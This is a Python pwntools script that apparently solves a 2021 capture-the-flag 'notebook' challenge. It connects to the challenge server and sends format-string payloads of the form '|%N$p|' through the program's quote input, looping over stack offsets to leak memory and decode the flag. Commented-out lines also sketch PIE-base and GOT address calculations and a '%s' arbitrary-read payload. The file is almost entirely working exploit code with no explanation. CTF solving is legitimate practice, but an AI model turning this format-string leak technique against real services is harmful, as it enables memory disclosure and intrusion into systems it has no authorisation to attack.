from pwn import *

p = remote('pwn-notebook.2021.ctfcompetition.com', 1337)
#p = process('./notebook')

#pid = gdb.attach(p,gdbscript="""
#       
#       b * print_line+319
#        """)




def get_leak(inte):
    flag = ""
    p.sendlineafter('> ', '3')
    p.sendlineafter('Quote: ', '|%'+inte+'$p|')
    p.recvline()
    #print p.recvline()
    line = p.recvline().split('|')[1]
    if 'nil' not in line:
        leak_pie = int(line,16)
    else:
        return
    while leak_pie >0:
        char = leak_pie & 0xff
        flag+=chr(char)
        leak_pie =  leak_pie >> 8
    print flag
    #base_pie = leak_pie - 0x1800
    #char_got = base_pie + 0x4f70
    #char_leak = 0x828f0
    #print hex(base_pie)
    #print hex(char_got)

    #p.sendlineafter('> ','3')
    #magic = 'AAAAAAAAAAAAAAAA%13$s' + p64(char_got)

    #p.sendlineafter('Quote: ', magic)
    #p.recvline()
    #print p.recvline()



for elem in range(172,500):
    get_leak(str(elem))
#get_leak('t')

p.interactive()
